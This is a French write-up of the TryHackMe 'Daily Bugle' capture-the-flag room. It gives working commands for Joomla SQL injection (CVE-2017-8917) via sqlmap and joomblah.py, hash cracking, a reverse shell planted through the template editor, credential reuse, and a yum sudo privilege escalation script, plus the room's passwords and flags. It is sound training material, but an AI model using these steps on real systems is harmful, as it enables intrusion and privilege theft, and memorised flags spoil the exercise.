# TryHackMe: Daily Bugle

**Objectif :** identifier la version vulnerable de Joomla, exploiter l'injection SQL de `com_fields`, casser le hash de l'utilisateur `jonah`, utiliser l'interface d'administration Joomla pour obtenir un reverse shell, pivoter vers l'utilisateur `jjameson`, puis elever les privileges via `yum`.

---

## Introduction

La room **Daily Bugle** est une machine web plus complete que la moyenne. Elle combine :

- enumeration classique
- vulnerabilite Joomla connue
- extraction et cassage de hash
- shell via template editor
- reutilisation de credentials
- privesc Linux via GTFOBins

La room est guidee par quatre questions principales. Je les reprends en suivant toute la chaine d'attaque.

---

## Task 1: Deploy

### Question 1: Access the web server, who robbed the bank?

Je commence par un scan :

```bash
nmap -sC -sV -Pn <IP>
```

Les resultats publics montrent :

- `22/tcp` - SSH
- `80/tcp` - HTTP
- `3306/tcp` - MariaDB

En ouvrant le site web, on trouve un article faisant reference a Spider-Man.

### Reponse

**Who robbed the bank?** `spiderman`

---

## Task 2: Obtain user and root

### Question 1: What is the Joomla version?

Le service HTTP se presente deja comme Joomla dans les headers Nmap. Je confirme de deux manieres :

```bash
curl -s http://<IP>/README.txt | head
joomscan --url http://<IP>
```

Le scan remonte :

```text
3.7.0
```

Cette version est importante car elle est vulnerable a **CVE-2017-8917**.

### Reponse

**Joomla version:** `3.7.0`

---

## Exploitation SQLi de Joomla

Le point d'entree de la faille est :

```text
index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=...
```

Je peux utiliser `sqlmap`, mais comme le hint de la room le souligne, un script Python public comme `joomblah.py` fait aussi tres bien le travail.

### Avec sqlmap

```bash
sqlmap -u "http://<IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 -p list[fullordering] --dbs
```

Puis enumeration de la base Joomla.

### Avec joomblah

```bash
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
python joomblah.py http://<IP>
```

Je recupere rapidement le hash bcrypt de l'utilisateur :

```text
jonah
```

Hash :

```text
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

---

## Cassage du hash de Jonah

### Question 2: What is Jonah’s cracked password?

Je sauvegarde le hash dans un fichier puis :

```bash
john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Le mot de passe cracke est :

```text
spiderman123
```

### Reponse

**Jonah password:** `spiderman123`

---

## Obtention d'un shell via l'admin Joomla

Je me connecte a :

```text
http://<IP>/administrator
```

avec :

- utilisateur : `jonah`
- mot de passe : `spiderman123`

Une fois dans l'interface d'administration, je vais dans :

- `Extensions`
- `Templates`
- `Templates`
- `Beez3`

Puis je remplace `index.php` par un reverse shell PHP, ou une variante minimaliste, en adaptant mon IP et mon port.

Je prepare un listener :

```bash
rlwrap nc -lvnp 4444
```

Puis je visite :

```text
http://<IP>/templates/beez3/index.php
```

et je recois un shell.

Je stabilise ensuite :

```bash
SHELL=/bin/bash script -q /dev/null
```

---

## Pivot vers jjameson et user flag

Le shell initial n'est pas encore `jjameson`. Je fouille donc dans la configuration Joomla :

```bash
cat /var/www/html/configuration.php
```

Cette configuration contient le mot de passe de la base :

```text
nv5uz9r3ZEDzVjNu
```

Ce mot de passe est aussi celui de l'utilisateur `jjameson`.

Je pivote avec :

```bash
su jjameson
```

Mot de passe :

```text
nv5uz9r3ZEDzVjNu
```

Puis :

```bash
cat /home/jjameson/user.txt
```

### Question 3: What is the user flag?

### Reponse

**user.txt:** `27a260fe3cba712cfdedb1c86d80442e`

---

## Privilege Escalation via yum

Je prefere ensuite me reconnecter proprement en SSH :

```bash
ssh jjameson@<IP>
```

Puis je verifie les privileges sudo :

```bash
sudo -l
```

La sortie montre :

```text
(ALL) NOPASSWD: /usr/bin/yum
```

`yum` est documente sur GTFOBins. Je prepare le plugin minimal permettant de lancer un shell :

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Le shell qui en resulte tourne en root.

Je confirme :

```bash
whoami
```

Puis je lis :

```bash
cat /root/root.txt
```

### Question 4: What is the root flag?

### Reponse

**root.txt:** `eec3d53292b1821868266858d7fa6f79`

---

## Resume des reponses de la room

- Access the web server, who robbed the bank? `spiderman`
- What is the Joomla version? `3.7.0`
- What is Jonah’s cracked password? `spiderman123`
- What is the user flag? `27a260fe3cba712cfdedb1c86d80442e`
- What is the root flag? `eec3d53292b1821868266858d7fa6f79`

---

## Commandes importantes

### Enumeration Joomla

```bash
joomscan --url http://<IP>
```

Confirme rapidement la version 3.7.0.

### Extraction du hash

```bash
python joomblah.py http://<IP>
```

Permet de sortir le hash de `jonah`.

### Crack du mot de passe

```bash
john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Donne `spiderman123`.

### Pivot utilisateur

```bash
cat /var/www/html/configuration.php
su jjameson
```

Reutilise les credentials de la base comme credentials systeme.

### Privesc yum

```bash
sudo yum -c $TF/x --enableplugin=y
```

Technique GTFOBins tres propre pour obtenir root.

---

## Conclusion

**Daily Bugle** est une room tres formatrice parce qu'elle impose une vraie chaine offensive web vers systeme : faille CMS, cassage de hash, execution de code, lecture de configuration, reutilisation d'identifiants et privilege escalation propre.

***Auteur*** *: Saad Idrissi*
